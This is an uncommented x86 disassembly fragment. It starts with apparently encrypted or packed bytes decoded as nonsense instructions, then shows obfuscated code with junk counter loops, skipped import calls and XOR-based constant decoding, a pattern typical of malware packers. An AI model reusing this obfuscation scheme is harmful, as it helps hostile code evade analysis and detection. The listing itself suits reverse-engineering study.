  41196f:	out    0x8,eax
  411971:	and    BYTE PTR [edx-0x79d92781],bh
  411977:	mov    BYTE PTR [edi+0x7d],bl
  41197a:	loopne 0x41192c
  41197c:	sub    edx,DWORD PTR [eax-0x17]
  41197f:	adc    ebx,esp
  411981:	and    al,0xeb
  411983:	scas   al,BYTE PTR es:[edi]
  411984:	mov    ch,0x8e
  411986:	aam    0x27
  411988:	jmp    0x829:0xc0e0e71
  41198f:	or     DWORD PTR [esi+edx*1-0x7016bd59],0x34
  411997:	inc    esp
  411998:	imul   ecx,DWORD PTR [esi+ebx*1-0x4a],0xffffff8a
  41199d:	add    eax,0xf047c351
  4119a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4119a3:	outs   dx,BYTE PTR ds:[esi]
  4119a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4119a5:	or     eax,0x855587da
  4119aa:	(bad)  
  4119ad:	or     edx,esp
  4119af:	(bad)  
  4119b0:	sub    bl,bh
  4119b2:	hlt    
  4119b3:	in     al,0x99
  4119b5:	jl     0x4119e1
  4119b7:	and    eax,ebp
  4119b9:	add    BYTE PTR [esi-0x22649801],0xee
  4119c0:	cmp    al,0x7e
  4119c2:	arpl   WORD PTR [esp+eax*1-0x1532a75e],di
  4119c9:	in     al,0x30
  4119cb:	add    DWORD PTR [ecx],ecx
  4119cd:	dec    ebp
  4119ce:	js     0x4119ec
  4119d0:	out    dx,eax
  4119d1:	sbb    DWORD PTR [ecx+eax*4],edx
  4119d4:	aaa    
  4119d5:	fisttp QWORD PTR [ecx+0x73]
  4119d8:	cmc    
  4119d9:	(bad)  
  4119db:	mov    ebx,0xee843956
  4119e0:	adc    ecx,DWORD PTR [eax]
  4119e2:	fsubr  DWORD PTR [ecx-0x2c67ae3d]
  4119e8:	dec    BYTE PTR [esi-0xf616c78]
  4119ee:	sub    BYTE PTR [eax+0xc],dl
  4119f1:	adc    BYTE PTR [esi+0x7a99e2e2],bh
  4119f7:	imul   eax,eax,0x1f6a63b1
  4119fd:	rcr    edx,cl
  4119ff:	leave  
  411a00:	daa    
  411a01:	pop    ebx
  411a02:	sub    al,0xe9
  411a04:	pop    es
  411a05:	pop    esi
  411a06:	xchg   ebp,eax
  411a07:	or     BYTE PTR [ecx-0x22],bh
  411a0a:	lds    edx,FWORD PTR [edi-0x6b]
  411a0d:	push   es
  411a0e:	int3   
  411a0f:	jbe    0x411a73
  411a11:	sti    
  411a12:	jns    0x4119fc
  411a14:	mov    eax,ds:0xa5746c1c
  411a19:	es mov ah,0xb8
  411a1c:	push   esi
  411a1d:	(bad)  
  411a1e:	sbb    DWORD PTR [edi],eax
  411a20:	push   ds
  411a21:	jg     0x411a28
  411a23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a24:	gs (bad) 
  411a26:	jp     0x411a77
  411a28:	push   es
  411a29:	dec    edi
  411a2a:	xchg   ebp,eax
  411a2b:	ja     0x411a5e
  411a2d:	pop    ss
  411a2e:	fcomp  DWORD PTR [eax+0x4749b04]
  411a34:	loop   0x411a74
  411a36:	xor    eax,0x121d953
  411a3b:	xlat   BYTE PTR ds:[ebx]
  411a3c:	xchg   edi,eax
  411a3d:	fadd   st(4),st
  411a3f:	xor    BYTE PTR [edx+0x26],ah
  411a42:	scas   al,BYTE PTR es:[edi]
  411a43:	test   DWORD PTR [ebx+eiz*8+0x4bf9f7f6],0x73ece144
  411a4e:	pushf  
  411a4f:	stos   DWORD PTR es:[edi],eax
  411a50:	jp     0x411a7a
  411a52:	inc    eax
  411a53:	fnsave ds:0x71ffed96
  411a59:	repz adc al,0xba
  411a5c:	fcom   DWORD PTR [edx-0x77]
  411a5f:	in     eax,dx
  411a60:	mov    bh,0x6
  411a62:	gs clc 
  411a64:	dec    ecx
  411a65:	out    0x34,eax
  411a67:	sub    ebx,edx
  411a69:	test   bl,bl
  411a6b:	and    cl,BYTE PTR [esi-0x59dc5fb5]
  411a71:	adc    ebp,esp
  411a73:	not    BYTE PTR [eax-0x4eaf45a5]
  411a79:	mov    eax,0x94aee06f
  411a7e:	xor    al,BYTE PTR [esi]
  411a80:	arpl   WORD PTR gs:[esi+0x66],di
  411a84:	std    
  411a85:	fcomp  QWORD PTR [ebx-0x6]
  411a88:	in     eax,dx
  411a89:	dec    ebx
  411a8a:	xchg   ebx,eax
  411a8b:	int    0xf6
  411a8d:	cmp    eax,0x31adbaaf
  411a92:	fcmovne st,st(3)
  411a94:	jo     0x411b08
  411a96:	mov    edx,0x302396b8
  411a9b:	imul   ecx,DWORD PTR [ebp-0x72],0x2357bd72
  411aa2:	aaa    
  411aa3:	cmp    DWORD PTR [eax-0x70e8cb79],esi
  411aa9:	cmp    DWORD PTR [edi+edx*4-0x5a],edi
  411aad:	clc    
  411aae:	sbb    edi,0xffffffc5
  411ab1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411ab2:	xchg   ebx,eax
  411ab3:	loop   0x411ae7
  411ab5:	sub    eax,0xd0628250
  411aba:	or     ebx,DWORD PTR [esi+eiz*2]
  411abd:	dec    edx
  411abe:	jbe    0x411b01
  411ac0:	jb     0x411a42
  411ac2:	inc    ebx
  411ac3:	mov    ds:0xc10906bc,eax
  411ac8:	inc    eax
  411ac9:	or     BYTE PTR [ebx],0xbd
  411acc:	sti    
  411acd:	(bad)  
  411ace:	dec    ebx
  411acf:	mov    esi,0x3d55d975
  411ad4:	cmp    bh,0xb4
  411ad7:	pop    esp
  411ad8:	repnz fsubrp st(4),st
  411adb:	ins    DWORD PTR es:[edi],dx
  411adc:	fimul  WORD PTR [eax]
  411ade:	mov    BYTE PTR [ebx+edx*8+0x4cd93630],dh
  411ae5:	nop
  411ae6:	mov    bh,0xd9
  411ae8:	scas   eax,DWORD PTR es:[edi]
  411ae9:	sub    ebp,DWORD PTR [edi+0x51a54671]
  411aef:	pop    edi
  411af0:	adc    ecx,edi
  411af2:	shr    DWORD PTR [esi-0x49],1
  411af5:	xchg   edi,eax
  411af6:	xchg   esi,eax
  411af7:	mov    ebx,0x9f118745
  411afc:	retf   0xe919
  411aff:	(bad)  
  411b00:	jl     0x411b65
  411b02:	fnstcw WORD PTR [esi-0x7a5838c7]
  411b08:	xchg   esi,eax
  411b09:	ret    0x97bb
  411b0c:	mov    al,ds:0x17ee404a
  411b11:	sbb    edx,DWORD PTR [esi]
  411b13:	push   ss
  411b14:	add    BYTE PTR [ebx+0x3ba8cd13],cl
  411b1a:	fwait
  411b1b:	push   ss
  411b1c:	jno    0x411afc
  411b1e:	push   edi
  411b1f:	aas    
  411b20:	xor    BYTE PTR ds:0x9e4a69ca,ch
  411b26:	es dec ebx
  411b28:	fidivr DWORD PTR [ebp+0x30cca1db]
  411b2e:	mov    cl,0x90
  411b30:	jg     0x411b33
  411b32:	and    al,0xed
  411b34:	or     esp,DWORD PTR [ecx]
  411b36:	ds xchg esp,eax
  411b38:	inc    esi
  411b39:	xchg   ecx,eax
  411b3a:	pop    ecx
  411b3b:	cmp    BYTE PTR [eax+0x12e3834f],0x6a
  411b42:	mov    dl,0xaf
  411b44:	addr16 shl ebx,1
  411b47:	jle    0x411b16
  411b49:	mov    ebp,0x44f0728e
  411b4e:	rol    BYTE PTR [ebp-0x426264b7],cl
  411b54:	inc    esi
  411b55:	inc    edi
  411b56:	int3   
  411b57:	mov    cl,0x58
  411b59:	or     al,0x2c
  411b5b:	ret    0x5219
  411b5e:	or     edi,DWORD PTR [ecx]
  411b60:	sbb    eax,0xd1861365
  411b65:	sti    
  411b66:	ins    BYTE PTR es:[edi],dx
  411b67:	inc    edi
  411b68:	cld    
  411b69:	cmp    al,0x90
  411b6b:	sub    eax,0x70156102
  411b70:	pop    ebp
  411b71:	dec    ebx
  411b72:	push   ebx
  411b73:	cwde   
  411b74:	push   ss
  411b75:	shr    DWORD PTR [edi+edx*8-0x44],1
  411b79:	dec    ebx
  411b7a:	or     ebp,DWORD PTR [ecx-0x6ff7bae3]
  411b80:	lds    ebp,FWORD PTR [edi+0x457a1cb6]
  411b86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411b87:	jl     0x411b1b
  411b89:	mov    BYTE PTR [ebx-0x1c],bl
  411b8c:	mov    ebx,0xcd81cae7
  411b91:	jne    0x411ba9
  411b93:	test   ebp,ebp
  411b95:	inc    ebx
  411b96:	mov    cl,0x45
  411b98:	pop    esp
  411b99:	lds    esp,FWORD PTR ds:0xd45d56e6
  411b9f:	xor    eax,0x4638eb0c
  411ba4:	mov    ds:0x91aac3db,eax
  411ba9:	lock arpl WORD PTR [edi],bp
  411bac:	(bad)  
  411bae:	inc    edx
  411baf:	popa   
  411bb0:	mov    esi,0xaa909c09
  411bb5:	shl    DWORD PTR [ecx-0x635e7b5e],cl
  411bbb:	mov    dh,0x7c
  411bbd:	cmp    edi,DWORD PTR [ebp-0x1fa628cb]
  411bc3:	ret    0x54e0
  411bc6:	xchg   edx,eax
  411bc7:	mov    cl,0x0
  411bc9:	xor    BYTE PTR [esi+0x66cf334c],al
  411bcf:	(bad)  
  411bd0:	les    ebp,FWORD PTR cs:[ebx+0x3a146081]
  411bd7:	xchg   esi,eax
  411bd8:	cs (bad) 
  411bda:	outs   dx,DWORD PTR ds:[esi]
  411bdb:	shl    DWORD PTR [esi+0x4d28e878],0xd8
  411be2:	jle    0x411ba3
  411be4:	and    al,0xe3
  411be6:	fdiv   st(4),st
  411be8:	xor    ecx,DWORD PTR [ecx]
  411bea:	fwait
  411beb:	mov    edi,es
  411bed:	xor    al,BYTE PTR [ecx-0x75]
  411bf0:	jne    0x411c02
  411bf2:	mov    DWORD PTR [esi+0x8],eax
  411bf5:	mov    eax,DWORD PTR [ebp+0x18]
  411bf8:	mov    esi,DWORD PTR [ebp+0x10]
  411bfb:	mov    DWORD PTR [esi+0xc],eax
  411bfe:	mov    eax,DWORD PTR [ebp+0x1c]
  411c01:	mov    esi,DWORD PTR [ebp+0x10]
  411c04:	mov    DWORD PTR [esi+0x10],eax
  411c07:	mov    eax,DWORD PTR [ebp+0x8]
  411c0a:	xor    eax,ecx
  411c0c:	add    eax,edx
  411c0e:	pop    esi
  411c0f:	leave  
  411c10:	ret    0x18
  411c13:	push   ebp
  411c14:	mov    ebp,esp
  411c16:	sub    esp,0x9c
  411c1c:	mov    ecx,DWORD PTR [ebp+0x8]
  411c1f:	sbb    DWORD PTR ds:0x426f29,edi
  411c25:	mov    eax,0x8a9d
  411c2a:	adc    DWORD PTR ds:0x426eb5,0x24b2
  411c34:	xor    ax,WORD PTR [ecx+0x20]
  411c38:	mov    DWORD PTR ds:0x426f0d,0x19
  411c42:	cmp    DWORD PTR ds:0x426f0d,0x0
  411c49:	je     0x411c79
  411c4f:	cmp    DWORD PTR ds:0x426f0d,0x23
  411c56:	jge    0x411c79
  411c5c:	jmp    0x411c67
  411c61:	call   DWORD PTR ds:0x430a00
  411c67:	mov    ecx,DWORD PTR ds:0x426f0d
  411c6d:	dec    ecx
  411c6e:	mov    DWORD PTR ds:0x426f0d,ecx
  411c74:	jmp    0x411c42
  411c79:	mov    ecx,0x3b5f
  411c7e:	add    ax,cx
  411c81:	mov    DWORD PTR ds:0x426e85,0x19
  411c8b:	cmp    DWORD PTR ds:0x426e85,0x0
  411c92:	je     0x411ce1
  411c98:	cmp    DWORD PTR ds:0x426e85,0xc
  411c9f:	jg     0x411ce1
  411ca5:	jmp    0x411cb3
  411caa:	push   DWORD PTR [ebp-0x10]
  411cad:	call   DWORD PTR ds:0x430a3c
  411cb3:	cmp    DWORD PTR ds:0x426e85,0xd
  411cba:	jne    0x411ccf
  411cc0:	xor    ecx,ecx
  411cc2:	or     ecx,DWORD PTR ds:0x426e85
  411cc8:	dec    ecx
  411cc9:	mov    DWORD PTR ds:0x426e85,ecx
  411ccf:	mov    ecx,DWORD PTR ds:0x426e85
  411cd5:	dec    ecx
  411cd6:	mov    DWORD PTR ds:0x426e85,ecx
  411cdc:	jmp    0x411c8b
  411ce1:	movzx  eax,ax
  411ce4:	mov    ecx,DWORD PTR ds:0x426f25
  411cea:	sub    DWORD PTR ds:0x426e89,ecx
  411cf0:	mov    DWORD PTR [ebp-0x10],eax
  411cf3:	mov    BYTE PTR [ebp-0x1],0x7a
  411cf7:	lea    eax,[ebp-0x1]
  411cfa:	mov    DWORD PTR [ebp-0xc],eax
  411cfd:	mov    al,BYTE PTR [ebp-0x1]
  411d00:	mov    ecx,DWORD PTR [ebp-0xc]
  411d03:	xor    al,0x81
  411d05:	sub    DWORD PTR ds:0x426f2d,0x318c
  411d0f:	add    al,0x6
  411d11:	sub    DWORD PTR ds:0x426ef5,0x54d2
  411d1b:	mov    BYTE PTR [ecx],al
  411d1d:	and    eax,eax
  411d1f:	mov    DWORD PTR [ebp-0x18],0xf89c85b5
  411d26:	push   ebx
  411d27:	and    DWORD PTR ds:0x426e8d,0x0
  411d31:	mov    ecx,DWORD PTR ds:0x426e8d
  411d37:	inc    ecx
  411d38:	mov    DWORD PTR ds:0x426e8d,ecx
  411d3e:	cmp    DWORD PTR ds:0x426e8d,0x22
  411d45:	jg     0x411d8e
  411d4b:	jmp    0x411d81
  411d50:	push   0x70b5
  411d55:	push   0x7924
  411d5a:	push   0x4ec8
  411d5f:	push   0x56ca
  411d64:	push   0x88b0
  411d69:	push   0x70c2
  411d6e:	push   0x4f11
  411d73:	push   DWORD PTR [ebp-0x1c]
  411d76:	push   0x827e
  411d7b:	call   DWORD PTR ds:0x430a04
  411d81:	cmp    DWORD PTR ds:0x426e8d,0x18
  411d88:	jb     0x411d31
  411d8e:	mov    DWORD PTR [ebp-0x8],0xf89c85b4
  411d95:	and    DWORD PTR ds:0x426ee1,0x0
  411d9f:	jmp    0x411daf
  411da4:	mov    eax,ds:0x426ee1
  411da9:	inc    eax
  411daa:	mov    ds:0x426ee1,eax
  411daf:	cmp    DWORD PTR ds:0x426ee1,0x10
  411db6:	jae    0x411e0b
  411dbc:	cmp    DWORD PTR ds:0x426ee1,0x6
  411dc3:	jb     0x411e0b
  411dc9:	jmp    0x411dee
  411dce:	push   0x426ebd
  411dd3:	push   0x863e
  411dd8:	push   DWORD PTR [ebp-0x14]
  411ddb:	push   DWORD PTR [ebp-0x28]
  411dde:	push   0x80d0
  411de3:	push   0x79b2
  411de8:	call   DWORD PTR ds:0x430a40
  411dee:	cmp    DWORD PTR ds:0x426ee1,0x5
  411df5:	jne    0x411e06
  411dfb:	mov    eax,ds:0x426ee1
  411e00:	inc    eax
  411e01:	mov    ds:0x426ee1,eax
  411e06:	jmp    0x411da4
  411e0b:	mov    ecx,DWORD PTR [ebp-0x18]
  411e0e:	push   esi
  411e0f:	mov    eax,0x75108b3
  411e14:	xor    ecx,eax
  411e16:	mov    esi,0x3272fa
  411e1b:	push   edi
  411e1c:	add    ecx,esi
  411e1e:	jmp    0x411e3e
  411e23:	not    DWORD PTR ds:0x426ea5
  411e29:	mov    dl,BYTE PTR [ebp-0x1]
  411e2c:	mov    DWORD PTR ds:0x426f25,0x1eab
  411e36:	mov    BYTE PTR [ebp+ecx*1-0x9c],dl
  411e3d:	inc    ecx
  411e3e:	mov    DWORD PTR ds:0x426ee1,0x6456
  411e48:	cmp    ecx,0x40
  411e4b:	mov    DWORD PTR ds:0x426ea9,0x5cb
  411e55:	jb     0x411e23
  411e5b:	sub    DWORD PTR ds:0x426ec5,0x4698
  411e65:	mov    edx,DWORD PTR [ebp-0x18]
  411e68:	xor    edx,eax
  411e6a:	add    edx,esi
  411e6c:	mov    DWORD PTR ds:0x426ea9,0x4896
  411e76:	jmp    0x411f44
  411e7b:	mov    edi,DWORD PTR [ebp+0x8]
  411e7e:	and    DWORD PTR ds:0x426e9d,0x0
  411e88:	jmp    0x411e9a
  411e8d:	mov    ecx,DWORD PTR ds:0x426e9d
  411e93:	inc    ecx
  411e94:	mov    DWORD PTR ds:0x426e9d,ecx
  411e9a:	cmp    DWORD PTR ds:0x426e9d,0x12
  411ea1:	jae    0x411ec4
  411ea7:	cmp    DWORD PTR ds:0x426e9d,0x1f
  411eae:	jg     0x411ec4
  411eb4:	jmp    0x411ebf
  411eb9:	call   DWORD PTR ds:0x430a08
  411ebf:	jmp    0x411e8d
  411ec4:	mov    ecx,0x8a9d
  411ec9:	add    DWORD PTR ds:0x426f1d,0x3bc7
  411ed3:	xor    cx,WORD PTR [edi+edx*4+0x2]
  411ed8:	mov    edi,0x3b5f
  411edd:	or     DWORD PTR ds:0x426ec9,0x426e8d
  411ee7:	add    cx,di
  411eea:	movzx  ecx,cx
  411eed:	mov    DWORD PTR [ebp-0xc],ecx
  411ef0:	mov    ecx,DWORD PTR ds:0x426ee9
  411ef6:	sub    ecx,DWORD PTR ds:0x426e99
  411efc:	mov    DWORD PTR ds:0x426ee9,ecx
  411f02:	mov    ecx,DWORD PTR [ebp+0x8]
  411f05:	or     DWORD PTR ds:0x426f2d,0x426e89
  411f0f:	movzx  ecx,WORD PTR [ecx+edx*4]
  411f13:	adc    DWORD PTR ds:0x426ebd,0x426ef1
  411f1d:	xor    ecx,0x8a9d
  411f23:	xor    DWORD PTR ds:0x426ef5,0x426e95
  411f2d:	add    ecx,edi
  411f2f:	mov    edi,DWORD PTR [ebp-0xc]
  411f32:	mov    DWORD PTR ds:0x426f09,0x3565
  411f3c:	mov    BYTE PTR [ebp+edi*1-0x9c],cl
  411f43:	inc    edx
  411f44:	mov    ecx,0x1c2a
  411f49:	mov    ecx,DWORD PTR [ebp-0x10]
  411f4c:	cmp    edx,ecx
  411f4e:	jne    0x411e7b
  411f54:	sub    edx,0x34ee
  411f5a:	mov    ecx,DWORD PTR [ebp-0x18]
  411f5d:	xor    DWORD PTR ds:0x426ef9,ecx
  411f63:	mov    edx,DWORD PTR [ebp+0x10]
  411f66:	mov    DWORD PTR ds:0x426ec5,0x17
  411f70:	cmp    DWORD PTR ds:0x426ec5,0x0
  411f77:	je     0x411fcf
  411f7d:	cmp    DWORD PTR ds:0x426ec5,0x2
  411f84:	jl     0x411fcf
  411f8a:	jmp    0x411f9f
  411f8f:	push   0x4ca2
  411f94:	push   0x426035
  411f99:	call   DWORD PTR ds:0x430a44
  411f9f:	cmp    DWORD PTR ds:0x426ec5,0x3
  411fa6:	jne    0x411fbb
  411fac:	xor    edi,edi
  411fae:	xor    edi,DWORD PTR ds:0x426ec5
  411fb4:	dec    edi
  411fb5:	mov    DWORD PTR ds:0x426ec5,edi
  411fbb:	xor    edi,edi
  411fbd:	add    edi,DWORD PTR ds:0x426ec5
  411fc3:	dec    edi
  411fc4:	mov    DWORD PTR ds:0x426ec5,edi
  411fca:	jmp    0x411f70
  411fcf:	xor    ecx,eax
  411fd1:	mov    DWORD PTR ds:0x426f21,0x1d
  411fdb:	cmp    DWORD PTR ds:0x426f21,0x0
  411fe2:	je     0x41201c
  411fe8:	cmp    DWORD PTR ds:0x426f21,0x2c
  411fef:	jg     0x41201c
  411ff5:	jmp    0x41200a
  411ffa:	push   0x426ed5
  411fff:	push   0x3809
  412004:	call   DWORD PTR ds:0x430a48
  41200a:	mov    edi,DWORD PTR ds:0x426f21
  412010:	dec    edi
  412011:	mov    DWORD PTR ds:0x426f21,edi
  412017:	jmp    0x411fdb
  41201c:	add    ecx,esi
  41201e:	xor    edi,DWORD PTR ds:0x426ea9
  412024:	mov    DWORD PTR [edx],ecx
  412026:	mov    ecx,DWORD PTR [ebp-0x18]
  412029:	xor    ecx,eax
  41202b:	add    ecx,esi
  41202d:	and    edi,0x6cf8
  412033:	mov    DWORD PTR [ebp-0xc],ecx
  412036:	mov    DWORD PTR ds:0x426ea5,0x13
  412040:	cmp    DWORD PTR ds:0x426ea5,0x0
  412047:	je     0x41207a
  41204d:	cmp    DWORD PTR ds:0x426ea5,0x1f
  412054:	jge    0x41207a
  41205a:	jmp    0x412068
  41205f:	push   DWORD PTR [ebp-0x24]
  412062:	call   DWORD PTR ds:0x430a0c
  412068:	mov    edi,DWORD PTR ds:0x426ea5
  41206e:	dec    edi
  41206f:	mov    DWORD PTR ds:0x426ea5,edi
  412075:	jmp    0x412040
  41207a:	mov    DWORD PTR [ebp+0x8],0xf89c85b5
  412081:	mov    DWORD PTR ds:0x426ea9,0x18
  41208b:	cmp    DWORD PTR ds:0x426ea9,0x0
  412092:	je     0x4120ec
  412098:	cmp    DWORD PTR ds:0x426ea9,0xa
  41209f:	ja     0x4120ec
  4120a5:	jmp    0x4120c0
  4120aa:	push   DWORD PTR [ebp-0x28]
  4120ad:	push   0x4ee1
  4120b2:	push   DWORD PTR [ebp-0x20]
  4120b5:	push   0x56ea
  4120ba:	call   DWORD PTR ds:0x430a4c
  4120c0:	cmp    DWORD PTR ds:0x426ea9,0xb
  4120c7:	jne    0x4120da
  4120cd:	mov    ecx,DWORD PTR ds:0x426ea9
  4120d3:	dec    ecx
  4120d4:	mov    DWORD PTR ds:0x426ea9,ecx
  4120da:	mov    ecx,DWORD PTR ds:0x426ea9
  4120e0:	dec    ecx
  4120e1:	mov    DWORD PTR ds:0x426ea9,ecx
  4120e7:	jmp    0x41208b
  4120ec:	mov    DWORD PTR [ebp-0x14],0xf89c85a5
  4120f3:	adc    edi,edi
  4120f5:	mov    DWORD PTR [ebp-0x10],0xf89c95b5
  4120fc:	mov    ecx,DWORD PTR ds:0x426f19
  412102:	adc    DWORD PTR ds:0x426eb9,ecx
  412108:	mov    ecx,DWORD PTR [ebp-0x14]
  41210b:	movzx  edi,BYTE PTR ds:0x426ef5
  412112:	add    edi,DWORD PTR ds:0x426ed5
  412118:	mov    DWORD PTR ds:0x426ef5,edi
  41211e:	mov    DWORD PTR [ebp+0x8],ecx
  412121:	mov    ecx,DWORD PTR [ebp+0x8]
  412124:	mov    DWORD PTR ds:0x426eb1,0x11
  41212e:	cmp    DWORD PTR ds:0x426eb1,0x0
  412135:	je     0x4121a1
  41213b:	cmp    DWORD PTR ds:0x426eb1,0x9
  412142:	jl     0x4121a1
  412148:	jmp    0x412175
  41214d:	push   DWORD PTR [ebp-0x24]
  412150:	push   0x5b11
  412155:	push   0x5886
  41215a:	push   DWORD PTR [ebp-0xc]
  41215d:	push   DWORD PTR [ebp-0x28]
  412160:	push   0x128a
  412165:	push   0x1ff9
  41216a:	push   0x6625
  41216f:	call   DWORD PTR ds:0x430a10
  412175:	cmp    DWORD PTR ds:0x426eb1,0xa
  41217c:	jne    0x41218f
  412182:	mov    edi,DWORD PTR ds:0x426eb1
  412188:	dec    edi
  412189:	mov    DWORD PTR ds:0x426eb1,edi
  41218f:	mov    edi,DWORD PTR ds:0x426eb1
  412195:	dec    edi
  412196:	mov    DWORD PTR ds:0x426eb1,edi
  41219c:	jmp    0x41212e
  4121a1:	xor    ecx,eax
  4121a3:	and    DWORD PTR ds:0x426ebd,0x0
  4121ad:	jmp    0x4121bf
  4121b2:	mov    edi,DWORD PTR ds:0x426ebd
  4121b8:	inc    edi
  4121b9:	mov    DWORD PTR ds:0x426ebd,edi
  4121bf:	cmp    DWORD PTR ds:0x426ebd,0x14
  4121c6:	jae    0x4121e9
  4121cc:	cmp    DWORD PTR ds:0x426ebd,0x1d
  4121d3:	jle    0x4121e9
  4121d9:	jmp    0x4121e4
  4121de:	call   DWORD PTR ds:0x430a14
  4121e4:	jmp    0x4121b2
  4121e9:	add    ecx,esi
  4121eb:	mov    edi,DWORD PTR ds:0x426ec9
  4121f1:	mov    ecx,0xf641bea
  4121f6:	mov    edi,0x5a1eade
  4121fb:	mov    DWORD PTR ds:0x426ed5,0x1d19
  412205:	je     0x416e72
  41220b:	and    DWORD PTR ds:0x426e95,0x0
  412215:	jmp    0x412229
  41221a:	xor    ebx,ebx
  41221c:	xor    ebx,DWORD PTR ds:0x426e95
  412222:	inc    ebx
  412223:	mov    DWORD PTR ds:0x426e95,ebx
  412229:	cmp    DWORD PTR ds:0x426e95,0x1f
  412230:	jae    0x41225c
  412236:	cmp    DWORD PTR ds:0x426e95,0x2f
  41223d:	jl     0x41225c
  412243:	jmp    0x412257
  412248:	push   DWORD PTR [ebp-0x18]
  41224b:	push   DWORD PTR [ebp-0x18]
  41224e:	push   DWORD PTR [ebp-0x10]
  412251:	call   DWORD PTR ds:0x430a18
  412257:	jmp    0x41221a
  41225c:	mov    edx,DWORD PTR [ebp+0x8]
  41225f:	mov    ebx,DWORD PTR ds:0x426ec5
  412265:	add    ebx,DWORD PTR ds:0x426ea1
  41226b:	mov    DWORD PTR ds:0x426ec5,ebx
  412271:	mov    ebx,DWORD PTR [ebp-0x8]
  412274:	xor    edx,eax
  412276:	sbb    DWORD PTR ds:0x426ea1,0x426edd
  412280:	xor    ebx,eax
  412282:	add    DWORD PTR ds:0x426e91,0x426ec5
  41228c:	sub    edx,ebx
  41228e:	sub    edx,esi
  412290:	sbb    DWORD PTR ds:0x426eb5,edi
  412296:	xor    edx,eax
  412298:	mov    DWORD PTR [ebp+0x8],edx
  41229b:	add    edx,0x4d69
  4122a1:	mov    edx,DWORD PTR [ebp+0x8]
  4122a4:	mov    ebx,DWORD PTR [ebp-0x58]
  4122a7:	lea    edx,[ebx+edx*1+0x5708f4]
  4122ae:	mov    DWORD PTR [ebp-0x58],edx
  4122b1:	mov    edx,DWORD PTR [ebp+0x8]
  4122b4:	xor    ebx,DWORD PTR ds:0x426f05
  4122ba:	mov    ebx,DWORD PTR [ebp-0x54]
  4122bd:	and    DWORD PTR ds:0x426f11,0x6a73
  4122c7:	add    edx,0x64f89a
  4122cd:	adc    DWORD PTR ds:0x426ea5,0x426ef1
  4122d7:	imul   edx,ebx
  4122da:	or     DWORD PTR ds:0x426eed,0x7801
  4122e4:	mov    DWORD PTR [ebp-0x54],edx
  4122e7:	and    DWORD PTR ds:0x426ea9,0x0
  4122f1:	mov    edx,DWORD PTR ds:0x426ea9
  4122f7:	inc    edx
  4122f8:	mov    DWORD PTR ds:0x426ea9,edx
  4122fe:	cmp    DWORD PTR ds:0x426ea9,0xa
  412305:	ja     0x41234d
  41230b:	jmp    0x412326
  412310:	push   DWORD PTR [ebp-0x18]
  412313:	push   0x70df
  412318:	push   DWORD PTR [ebp-0x28]
  41231b:	push   0x6818
  412320:	call   DWORD PTR ds:0x430a1c
  412326:	cmp    DWORD PTR ds:0x426ea9,0x9
  41232d:	jne    0x412340
  412333:	mov    edx,DWORD PTR ds:0x426ea9
  412339:	inc    edx
  41233a:	mov    DWORD PTR ds:0x426ea9,edx
  412340:	cmp    DWORD PTR ds:0x426ea9,0x1f
  412347:	jb     0x4122f1
  41234d:	mov    edx,DWORD PTR [ebp+0x8]
  412350:	movzx  ebx,WORD PTR ds:0x426ef1
  412357:	sub    DWORD PTR ds:0x426eb9,ebx
  41235d:	mov    ebx,DWORD PTR [ebp-0x50]
  412360:	add    edx,0x242ebe9
  412366:	sbb    DWORD PTR ds:0x426ef1,0x426ee1
  412370:	and    edx,ebx
  412372:	mov    DWORD PTR [ebp-0x50],edx
  412375:	xor    edx,edx
  412377:	or     edx,DWORD PTR ds:0x426ed1
  41237d:	adc    DWORD PTR ds:0x426ec5,edx
  412383:	mov    edx,DWORD PTR [ebp+0x8]
  412386:	and    DWORD PTR ds:0x426f09,0x423
  412390:	mov    ebx,DWORD PTR [ebp-0x4c]
  412393:	and    DWORD PTR ds:0x426ee1,0x67c7
  41239d:	add    edx,ecx
  41239f:	mov    DWORD PTR ds:0x426ee1,0x22dc
  4123a9:	or     edx,ebx
  4123ab:	and    DWORD PTR ds:0x426f2d,0x602a
  4123b5:	mov    DWORD PTR [ebp-0x4c],edx
  4123b8:	and    DWORD PTR ds:0x426e8d,edx
  4123be:	mov    edx,DWORD PTR [ebp+0x8]
  4123c1:	mov    DWORD PTR ds:0x426ee9,0x1e
  4123cb:	cmp    DWORD PTR ds:0x426ee9,0x0
  4123d2:	je     0x41241c
  4123d8:	cmp    DWORD PTR ds:0x426ee9,0xf
  4123df:	jl     0x41241c
  4123e5:	jmp    0x4123f0
  4123ea:	call   DWORD PTR ds:0x430a20
  4123f0:	cmp    DWORD PTR ds:0x426ee9,0x10
  4123f7:	jne    0x41240a
  4123fd:	mov    ebx,DWORD PTR ds:0x426ee9
  412403:	dec    ebx
  412404:	mov    DWORD PTR ds:0x426ee9,ebx
  41240a:	mov    ebx,DWORD PTR ds:0x426ee9
  412410:	dec    ebx
  412411:	mov    DWORD PTR ds:0x426ee9,ebx
  412417:	jmp    0x4123cb
  41241c:	mov    ebx,0xfdbe0321
  412421:	sub    ebx,edx
  412423:	sbb    edx,0x3018
  412429:	add    ebx,DWORD PTR [ebp-0x48]
  41242c:	sub    DWORD PTR ds:0x426e85,0x15fb
  412436:	mov    DWORD PTR [ebp-0x48],ebx
  412439:	mov    DWORD PTR ds:0x426f0d,0x10
  412443:	cmp    DWORD PTR ds:0x426f0d,0x0
  41244a:	je     0x4124a6
  412450:	cmp    DWORD PTR ds:0x426f0d,0x5
  412457:	jbe    0x4124a6
  41245d:	jmp    0x412478
  412462:	push   0x426000
  412467:	push   DWORD PTR [ebp-0x24]
  41246a:	push   DWORD PTR [ebp-0x14]
  41246d:	push   0x32fd
  412472:	call   DWORD PTR ds:0x430a24
  412478:	cmp    DWORD PTR ds:0x426f0d,0x6
  41247f:	jne    0x412494
  412485:	xor    ebx,ebx
  412487:	or     ebx,DWORD PTR ds:0x426f0d
  41248d:	dec    ebx
  41248e:	mov    DWORD PTR ds:0x426f0d,ebx
  412494:	mov    ebx,DWORD PTR ds:0x426f0d
  41249a:	dec    ebx
  41249b:	mov    DWORD PTR ds:0x426f0d,ebx
  4124a1:	jmp    0x412443
  4124a6:	mov    edx,DWORD PTR [ebp+0x8]
  4124a9:	mov    ebx,DWORD PTR [ebp-0x44]
  4124ac:	add    edx,edi
